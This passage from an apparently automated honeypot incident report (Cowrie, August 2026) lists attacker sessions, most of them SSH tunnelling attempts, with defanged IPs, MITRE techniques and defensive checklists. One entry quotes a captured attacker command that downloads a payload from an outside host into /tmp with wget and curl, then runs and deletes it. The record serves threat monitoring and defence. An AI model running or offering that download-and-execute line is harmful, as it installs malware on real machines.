- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eadf099d6d0d

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-23 05:44 |
| **Last Seen** | 2026-08-23 05:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:44:40` | `cowrie.session.connect` |
| `2026-08-23 05:44:41` | `cowrie.client.version` |
| `2026-08-23 05:44:41` | `cowrie.client.kex` |
| `2026-08-23 05:44:42` | `cowrie.login.success` |
| `2026-08-23 05:44:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d3a98971b0

| Field | Detail |
|---|---|
| **Source IP** | `34.76.194[.]102` |
| **First Seen** | 2026-08-23 05:47 |
| **Last Seen** | 2026-08-23 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:47:15` | `cowrie.session.connect` |
| `2026-08-23 05:47:15` | `cowrie.login.success` |
| `2026-08-23 05:47:16` | `cowrie.session.params` |
| `2026-08-23 05:47:16` | `cowrie.command.input` |
| `2026-08-23 05:47:16` | `cowrie.command.input` |
| `2026-08-23 05:47:16` | `cowrie.command.failed` |
| `2026-08-23 05:47:16` | `cowrie.command.input` |
| `2026-08-23 05:47:16` | `cowrie.log.closed` |
| `2026-08-23 05:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.194[.]102` to AbuseIPDB if not already reported
- [ ] Block `34.76.194[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61aeda8ba657

| Field | Detail |
|---|---|
| **Source IP** | `34.76.194[.]102` |
| **First Seen** | 2026-08-23 05:47 |
| **Last Seen** | 2026-08-23 05:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:47:24` | `cowrie.session.connect` |
| `2026-08-23 05:47:24` | `cowrie.login.success` |
| `2026-08-23 05:47:25` | `cowrie.session.params` |
| `2026-08-23 05:47:25` | `cowrie.command.input` |
| `2026-08-23 05:47:25` | `cowrie.command.failed` |
| `2026-08-23 05:47:28` | `cowrie.log.closed` |
| `2026-08-23 05:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.194[.]102` to AbuseIPDB if not already reported
- [ ] Block `34.76.194[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a5e1988103

| Field | Detail |
|---|---|
| **Source IP** | `34.76.194[.]102` |
| **First Seen** | 2026-08-23 05:47 |
| **Last Seen** | 2026-08-23 05:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:47:26` | `cowrie.session.connect` |
| `2026-08-23 05:47:26` | `cowrie.login.success` |
| `2026-08-23 05:47:27` | `cowrie.session.params` |
| `2026-08-23 05:47:27` | `cowrie.command.input` |
| `2026-08-23 05:47:28` | `cowrie.log.closed` |
| `2026-08-23 05:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.194[.]102` to AbuseIPDB if not already reported
- [ ] Block `34.76.194[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb7e9bf6cb3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:48 |
| **Last Seen** | 2026-08-23 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:48:04` | `cowrie.session.connect` |
| `2026-08-23 05:48:04` | `cowrie.client.version` |
| `2026-08-23 05:48:04` | `cowrie.client.kex` |
| `2026-08-23 05:48:05` | `cowrie.login.success` |
| `2026-08-23 05:48:06` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:48:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:48:06` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d51640b1fff

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:48 |
| **Last Seen** | 2026-08-23 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:48:08` | `cowrie.session.connect` |
| `2026-08-23 05:48:08` | `cowrie.client.version` |
| `2026-08-23 05:48:08` | `cowrie.client.kex` |
| `2026-08-23 05:48:09` | `cowrie.login.success` |
| `2026-08-23 05:48:09` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:48:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:48:10` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa03b98d1c0f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-23 05:56 |
| **Last Seen** | 2026-08-23 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:56:28` | `cowrie.session.connect` |
| `2026-08-23 05:56:28` | `cowrie.telnet.option` |
| `2026-08-23 05:56:28` | `cowrie.login.success` |
| `2026-08-23 05:56:29` | `cowrie.session.params` |
| `2026-08-23 05:56:29` | `cowrie.telnet.option` |
| `2026-08-23 05:56:29` | `cowrie.telnet.option` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.failed` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.success` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.failed` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.success` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.failed` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.success` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.command.failed` |
| `2026-08-23 05:56:29` | `cowrie.command.input` |
| `2026-08-23 05:56:29` | `cowrie.log.closed` |
| `2026-08-23 05:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac3b41a822a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:57 |
| **Last Seen** | 2026-08-23 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:57:32` | `cowrie.session.connect` |
| `2026-08-23 05:57:32` | `cowrie.client.version` |
| `2026-08-23 05:57:32` | `cowrie.client.kex` |
| `2026-08-23 05:57:33` | `cowrie.login.success` |
| `2026-08-23 05:57:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:57:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:57:33` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d07b80f5f3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:57 |
| **Last Seen** | 2026-08-23 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:57:36` | `cowrie.session.connect` |
| `2026-08-23 05:57:36` | `cowrie.client.version` |
| `2026-08-23 05:57:36` | `cowrie.client.kex` |
| `2026-08-23 05:57:37` | `cowrie.login.success` |
| `2026-08-23 05:57:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:57:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:57:37` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45c34fbeb86

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:07 |
| **Last Seen** | 2026-08-23 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:07:01` | `cowrie.session.connect` |
| `2026-08-23 06:07:01` | `cowrie.client.version` |
| `2026-08-23 06:07:02` | `cowrie.client.kex` |
| `2026-08-23 06:07:02` | `cowrie.login.success` |
| `2026-08-23 06:07:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:07:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:07:03` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8dcd68c703a

| Field | Detail |
|---|---|
| **Source IP** | `69.124.69[.]20` |
| **First Seen** | 2026-08-23 06:07 |
| **Last Seen** | 2026-08-23 06:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:07:05` | `cowrie.session.connect` |
| `2026-08-23 06:07:05` | `cowrie.client.version` |
| `2026-08-23 06:07:05` | `cowrie.client.kex` |
| `2026-08-23 06:07:07` | `cowrie.login.success` |
| `2026-08-23 06:07:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.124.69[.]20` to AbuseIPDB if not already reported
- [ ] Block `69.124.69[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73dbf9e8e617

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:07 |
| **Last Seen** | 2026-08-23 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:07:05` | `cowrie.session.connect` |
| `2026-08-23 06:07:05` | `cowrie.client.version` |
| `2026-08-23 06:07:06` | `cowrie.client.kex` |
| `2026-08-23 06:07:06` | `cowrie.login.success` |
| `2026-08-23 06:07:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:07:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:07:07` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06dbe78db436

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-08-23 06:07 |
| **Last Seen** | 2026-08-23 06:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:07:12` | `cowrie.session.connect` |
| `2026-08-23 06:07:13` | `cowrie.client.version` |
| `2026-08-23 06:07:13` | `cowrie.client.kex` |
| `2026-08-23 06:07:14` | `cowrie.login.success` |
| `2026-08-23 06:07:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9afdd20b2280

| Field | Detail |
|---|---|
| **Source IP** | `202.88.236[.]38` |
| **First Seen** | 2026-08-23 06:12 |
| **Last Seen** | 2026-08-23 06:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:12:15` | `cowrie.session.connect` |
| `2026-08-23 06:12:15` | `cowrie.client.version` |
| `2026-08-23 06:12:15` | `cowrie.client.kex` |
| `2026-08-23 06:12:17` | `cowrie.login.success` |
| `2026-08-23 06:12:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.88.236[.]38` to AbuseIPDB if not already reported
- [ ] Block `202.88.236[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac15a3620269

| Field | Detail |
|---|---|
| **Source IP** | `181.119.64[.]79` |
| **First Seen** | 2026-08-23 06:12 |
| **Last Seen** | 2026-08-23 06:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:12:23` | `cowrie.session.connect` |
| `2026-08-23 06:12:24` | `cowrie.client.version` |
| `2026-08-23 06:12:24` | `cowrie.client.kex` |
| `2026-08-23 06:12:25` | `cowrie.login.success` |
| `2026-08-23 06:12:25` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.119.64[.]79` to AbuseIPDB if not already reported
- [ ] Block `181.119.64[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766dbe32026f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:16 |
| **Last Seen** | 2026-08-23 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:16:21` | `cowrie.session.connect` |
| `2026-08-23 06:16:21` | `cowrie.client.version` |
| `2026-08-23 06:16:21` | `cowrie.client.kex` |
| `2026-08-23 06:16:22` | `cowrie.login.success` |
| `2026-08-23 06:16:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:16:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:16:22` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe652040e5f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:16 |
| **Last Seen** | 2026-08-23 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:16:25` | `cowrie.session.connect` |
| `2026-08-23 06:16:25` | `cowrie.client.version` |
| `2026-08-23 06:16:25` | `cowrie.client.kex` |
| `2026-08-23 06:16:26` | `cowrie.login.success` |
| `2026-08-23 06:16:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:16:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:16:26` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4923f32a6fe

| Field | Detail |
|---|---|
| **Source IP** | `81.215.2[.]43` |
| **First Seen** | 2026-08-23 06:17 |
| **Last Seen** | 2026-08-23 06:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:17:05` | `cowrie.session.connect` |
| `2026-08-23 06:17:06` | `cowrie.client.version` |
| `2026-08-23 06:17:06` | `cowrie.client.kex` |
| `2026-08-23 06:17:07` | `cowrie.login.success` |
| `2026-08-23 06:17:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.215.2[.]43` to AbuseIPDB if not already reported
- [ ] Block `81.215.2[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8052ac395c4

| Field | Detail |
|---|---|
| **Source IP** | `170.168.6[.]27` |
| **First Seen** | 2026-08-23 06:17 |
| **Last Seen** | 2026-08-23 06:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:17:12` | `cowrie.session.connect` |
| `2026-08-23 06:17:13` | `cowrie.client.version` |
| `2026-08-23 06:17:13` | `cowrie.client.kex` |
| `2026-08-23 06:17:14` | `cowrie.login.success` |
| `2026-08-23 06:17:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.168.6[.]27` to AbuseIPDB if not already reported
- [ ] Block `170.168.6[.]27` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a25d1fad4589

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-08-23 06:20 |
| **Last Seen** | 2026-08-23 06:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:20:12` | `cowrie.session.connect` |
| `2026-08-23 06:20:13` | `cowrie.client.version` |
| `2026-08-23 06:20:13` | `cowrie.client.kex` |
| `2026-08-23 06:20:15` | `cowrie.login.success` |
| `2026-08-23 06:20:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0e6bcba0ab

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-08-23 06:20 |
| **Last Seen** | 2026-08-23 06:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:20:22` | `cowrie.session.connect` |
| `2026-08-23 06:20:22` | `cowrie.client.version` |
| `2026-08-23 06:20:22` | `cowrie.client.kex` |
| `2026-08-23 06:20:24` | `cowrie.login.success` |
| `2026-08-23 06:20:25` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88206bbbf633

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:25 |
| **Last Seen** | 2026-08-23 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:25:56` | `cowrie.session.connect` |
| `2026-08-23 06:25:56` | `cowrie.client.version` |
| `2026-08-23 06:25:57` | `cowrie.client.kex` |
| `2026-08-23 06:25:58` | `cowrie.login.success` |
| `2026-08-23 06:25:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:25:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:25:58` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc25d6b8192d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:26 |
| **Last Seen** | 2026-08-23 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:26:00` | `cowrie.session.connect` |
| `2026-08-23 06:26:00` | `cowrie.client.version` |
| `2026-08-23 06:26:00` | `cowrie.client.kex` |
| `2026-08-23 06:26:01` | `cowrie.login.success` |
| `2026-08-23 06:26:01` | `cowrie.direct-tcpip.request` |
